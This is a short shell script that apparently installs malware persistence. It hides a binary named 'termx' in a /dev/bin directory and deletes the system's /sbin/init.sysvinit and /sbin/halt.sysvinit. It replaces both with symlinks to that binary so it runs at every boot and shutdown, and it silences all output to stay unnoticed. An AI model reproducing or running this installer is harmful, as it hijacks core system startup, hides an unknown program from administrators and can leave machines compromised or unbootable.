 #!/bin/sh
rm -r /dev/bin >/dev/null 2>&1

mkdir /dev/bin >/dev/null 2>&1
cp ./termx /dev/bin/termx >/dev/null 2>&1
chmod +x /dev/bin/termx >/dev/null 2>&1

cp /sbin/halt.sysvinit /dev/bin/halt.sysvinit >/dev/null 2>&1
cp /sbin/init.sysvinit /dev/bin/init.sysvinit >/dev/null 2>&1
rm /sbin/halt.sysvinit >/dev/null 2>&1
rm /sbin/init.sysvinit >/dev/null 2>&1
ln -s /dev/bin/termx /sbin/halt.sysvinit
ln -s /dev/bin/termx /sbin/init.sysvinit 
/dev/bin/termx >/dev/null 2>&1